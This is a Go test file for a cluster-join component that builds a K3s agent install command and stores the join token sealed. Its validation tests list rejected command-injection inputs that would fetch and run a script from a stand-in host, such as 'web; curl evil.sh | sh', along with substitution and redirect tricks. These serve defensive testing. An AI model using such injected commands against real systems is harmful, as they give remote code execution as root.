package cluster

import (
	"context"
	"io"
	"log/slog"
	"os"
	"strings"
	"testing"

	"github.com/google/uuid"

	"github.com/codeblocktz/yacht/internal/secret"
	"github.com/codeblocktz/yacht/internal/store"
)

// A pool name ends up in a command somebody pastes into a root shell, so the
// rule is not "escape it" but "refuse anything that could be more than a name".
// Every rejected case below is a command that would otherwise run.
func TestAPoolNameCannotEndTheCommand(t *testing.T) {
	for _, tc := range []struct {
		name string
		pool string
		ok   bool
	}{
		{"plain", "web", true},
		{"dashes and digits", "gpu-pool-2", true},
		{"dots and underscores", "eu.west_1", true},
		{"empty means no label", "", true},

		{"semicolon", "web; curl evil.sh | sh", false},
		{"backtick", "web`id`", false},
		{"dollar substitution", "web$(id)", false},
		{"pipe", "web|id", false},
		{"ampersand", "web&", false},
		{"newline", "web\ncurl evil.sh", false},
		{"space", "web pool", false},
		{"redirect", "web>/etc/passwd", false},
		{"quote", `web"`, false},
		{"uppercase", "Web", false},
		{"leading dash", "-web", false},
		{"trailing dot", "web.", false},
		{"too long", strings.Repeat("a", 64), false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidatePool(tc.pool)
			if tc.ok && err != nil {
				t.Fatalf("ValidatePool(%q) = %v, want accepted", tc.pool, err)
			}
			if !tc.ok && err == nil {
				t.Fatalf("ValidatePool(%q) was accepted — it would run in a root shell", tc.pool)
			}
		})
	}
}

// The token travels to this address. An agent pointed at plain http would hand
// it to anything on the path, and an address a shell would split is a second
// command.
func TestAServerAddressCannotBeUnsafe(t *testing.T) {
	for _, tc := range []struct {
		name string
		url  string
		ok   bool
	}{
		{"https with port", "https://10.0.0.1:6443", true},
		{"https with name", "https://cluster.example.com:6443", true},

		{"empty", "", false},
		{"plain http", "http://10.0.0.1:6443", false},
		{"no scheme", "10.0.0.1:6443", false},
		{"no host", "https://", false},
		{"semicolon", "https://10.0.0.1:6443;curl evil.sh|sh", false},
		{"space", "https://10.0.0.1:6443 --token x", false},
		{"backtick", "https://10.0.0.1:6443`id`", false},
		{"newline", "https://10.0.0.1:6443\ncurl evil.sh", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateServerURL(tc.url)
			if tc.ok && err != nil {
				t.Fatalf("ValidateServerURL(%q) = %v, want accepted", tc.url, err)
			}
			if !tc.ok && err == nil {
				t.Fatalf("ValidateServerURL(%q) was accepted", tc.url)
			}
		})
	}
}

// The command has to be the one K3s actually documents, or it fails on a
// machine somebody has already gone to the trouble of provisioning.
func TestTheCommandJoinsAnAgentAndLabelsIt(t *testing.T) {
	got := BuildCommand("https://10.0.0.1:6443", "K10secret::server:pw", Machine{Pool: "web"})

	for _, want := range []string{
		"curl -sfL https://get.k3s.io",
		"K3S_URL=https://10.0.0.1:6443",
		"K3S_TOKEN=K10secret::server:pw",
		"sh -s -",
		"--node-label yacht/pool=web",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("command is missing %q:\n%s", want, got)
		}
	}
	// The label is passed to the agent, so it has to come after the marker
	// that starts the agent's own arguments.
	if strings.Index(got, "sh -s -") > strings.Index(got, "--node-label") {
		t.Errorf("the label is not passed to the agent:\n%s", got)
	}
}

// No pool is a normal node, not a node labelled with the empty string.
func TestNoPoolMeansNoLabel(t *testing.T) {
	if got := BuildCommand("https://10.0.0.1:6443", "t", Machine{}); strings.Contains(got, "node-label") {
		t.Errorf("a node with no pool was given a label:\n%s", got)
	}
}

// A site rides in the same root shell as a pool, so it is held to the same
// rule, and a public address has to be an address and nothing more.
func TestASiteOrAddressCannotEndTheCommand(t *testing.T) {
	for _, tc := range []struct {
		name string
		m    Machine
		ok   bool
	}{
		{"site", Machine{Site: "dar-a"}, true},
		{"ipv4", Machine{PublicIP: "203.0.113.7"}, true},
		{"ipv6", Machine{PublicIP: "2001:db8::7"}, true},
		{"everything", Machine{Pool: "web", Site: "dar-b", PublicIP: "198.51.100.2"}, true},

		{"site with a command", Machine{Site: "dar; curl evil.sh | sh"}, false},
		{"uppercase site", Machine{Site: "DAR-A"}, false},
		{"address with a command", Machine{PublicIP: "203.0.113.7;id"}, false},
		{"address with a flag", Machine{PublicIP: "203.0.113.7 --token x"}, false},
		{"hostname", Machine{PublicIP: "node.example.com"}, false},
		{"leading zeros", Machine{PublicIP: "203.0.113.007"}, false},
		{"zoned", Machine{PublicIP: "fe80::1%eth0"}, false},
		{"not shortest form", Machine{PublicIP: "2001:db8:0::7"}, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.m.Validate()
			if tc.ok && err != nil {
				t.Fatalf("Validate(%+v) = %v, want accepted", tc.m, err)
			}
			if !tc.ok && err == nil {
				t.Fatalf("Validate(%+v) was accepted — it would run in a root shell", tc.m)
			}
		})
	}
}

// A site is the zone label the scheduler spreads by, and a public address is
// what the agent's WireGuard peers dial. Both are the agent's own arguments.
func TestTheCommandCarriesTheSiteAndPublicAddress(t *testing.T) {
	got := BuildCommand("https://203.0.113.1:6443", "t",
		Machine{Site: "dar-b", PublicIP: "198.51.100.2"})

	for _, want := range []string{
		"--node-label topology.kubernetes.io/zone=dar-b",
		"--node-external-ip 198.51.100.2",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("command is missing %q:\n%s", want, got)
		}
		if strings.Index(got, "sh -s -") > strings.Index(got, want) {
			t.Errorf("%q is not passed to the agent:\n%s", want, got)
		}
	}
	if got := BuildCommand("https://10.0.0.1:6443", "t", Machine{}); strings.Contains(got, "external-ip") {
		t.Errorf("a machine with no public address was given one:\n%s", got)
	}
}

// ---- storage

func testJoiner(t *testing.T, withKey bool) *Joiner {
	t.Helper()
	dsn := os.Getenv("YACHT_TEST_DATABASE_URL")
	if dsn == "" {
		t.Skip("set YACHT_TEST_DATABASE_URL to run cluster storage tests")
	}
	ctx := context.Background()
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	if err := store.Migrate(ctx, dsn, log); err != nil {
		t.Fatalf("migrate: %v", err)
	}
	pool, err := store.Connect(ctx, dsn)
	if err != nil {
		t.Fatalf("connect: %v", err)
	}
	t.Cleanup(pool.Close)

	clear := func() {
		if _, err := pool.Exec(ctx, `DELETE FROM cluster_join`); err != nil {
			t.Errorf("clear join settings: %v", err)
		}
	}
	clear()
	t.Cleanup(clear)

	var keeper *secret.Keeper
	if withKey {
		keeper, err = secret.NewKeeper("phPPpBeiO4QSsWBp3FTDCPur8Lnws5F0/1OEuxj5ics=")
		if err != nil {
			t.Fatalf("keeper: %v", err)
		}
	}
	return New(pool, keeper, log)
}

// A token stored readable would be the protection in name only, and nothing
// about the install would say so.
func TestAJoinTokenIsRefusedWithNoKey(t *testing.T) {
	j := testJoiner(t, false)

	err := j.SetJoin(context.Background(), "https://10.0.0.1:6443", "K10secret", uuid.New())
	if err == nil {
		t.Fatal("a join token was stored with no key to seal it")
	}
}

// The column holds sealed bytes, not the token. A database dump must not be a
// way to add a machine to the cluster.
func TestTheStoredTokenIsNotReadable(t *testing.T) {
	ctx := context.Background()
	j := testJoiner(t, true)
	const token = "K10deadbeef::server:hunter2"

	if err := j.SetJoin(ctx, "https://10.0.0.1:6443", token, uuid.Nil); err != nil {
		t.Fatalf("set join: %v", err)
	}

	row, err := j.q.GetClusterJoin(ctx)
	if err != nil {
		t.Fatalf("read row: %v", err)
	}
	if strings.Contains(string(row.TokenSealed), token) {
		t.Fatal("the join token is stored in the clear")
	}

	// And it still comes back out, so sealing is not merely mangling it.
	cmd, err := j.Command(ctx, Machine{Pool: "web"})
	if err != nil {
		t.Fatalf("command: %v", err)
	}
	if !strings.Contains(cmd, token) {
		t.Fatal("the join command does not carry the token that was stored")
	}
}

// Settings is what every page takes, so it must not be able to leak the token
// by carrying it somewhere it was not needed.
func TestSettingsNeverCarriesTheToken(t *testing.T) {
	ctx := context.Background()
	j := testJoiner(t, true)
	const token = "K10deadbeef::server:hunter2"

	if err := j.SetJoin(ctx, "https://10.0.0.1:6443", token, uuid.Nil); err != nil {
		t.Fatalf("set join: %v", err)
	}
	s, err := j.Settings(ctx)
	if err != nil {
		t.Fatalf("settings: %v", err)
	}
	if !s.TokenSet {
		t.Error("settings do not report the token as set")
	}
	if strings.Contains(s.ServerURL, token) || strings.Contains(s.UpdatedAt, token) {
		t.Fatal("the token reached a field a page renders")
	}
}

// One row by constraint, not by convention. A second row nobody noticed is how
// a join page starts handing out a token that was rotated last month.
func TestThereCanOnlyBeOneJoinRow(t *testing.T) {
	ctx := context.Background()
	j := testJoiner(t, true)

	if err := j.SetJoin(ctx, "https://10.0.0.1:6443", "first", uuid.Nil); err != nil {
		t.Fatalf("set join: %v", err)
	}
	if err := j.SetJoin(ctx, "https://10.0.0.2:6443", "second", uuid.Nil); err != nil {
		t.Fatalf("replace join: %v", err)
	}

	s, err := j.Settings(ctx)
	if err != nil {
		t.Fatalf("settings: %v", err)
	}
	if s.ServerURL != "https://10.0.0.2:6443" {
		t.Fatalf("server address is %q, want the one stored second", s.ServerURL)
	}
	cmd, err := j.Command(ctx, Machine{})
	if err != nil {
		t.Fatalf("command: %v", err)
	}
	if strings.Contains(cmd, "first") {
		t.Fatal("the command carries a token that was replaced")
	}
}

// Nothing stored is a prompt to configure, not a command with holes in it.
func TestNoSettingsIsItsOwnAnswer(t *testing.T) {
	j := testJoiner(t, true)

	if _, err := j.Settings(context.Background()); err != ErrNotConfigured {
		t.Fatalf("Settings error = %v, want ErrNotConfigured", err)
	}
	if _, err := j.Command(context.Background(), Machine{Pool: "web"}); err != ErrNotConfigured {
		t.Fatalf("Command error = %v, want ErrNotConfigured", err)
	}
}
